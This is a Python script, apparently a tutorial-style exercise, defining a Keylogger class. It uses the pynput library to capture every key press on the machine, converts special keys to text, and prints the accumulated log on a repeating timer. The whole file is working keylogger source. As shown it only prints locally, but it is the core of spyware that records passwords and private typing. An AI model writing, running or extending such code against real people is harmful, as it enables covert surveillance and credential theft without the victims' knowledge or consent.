#!/usr/bin/env python

from pynput import keyboard
import threading



class Keylogger():

    def __init__(self, time_interval):
        self.log = ""
        self.interval = time_interval

    def append_to_log(self, string):
        self.log = self.log + string

    def procces_key_press(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.tab:
                current_key = "     "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)


    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.procces_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
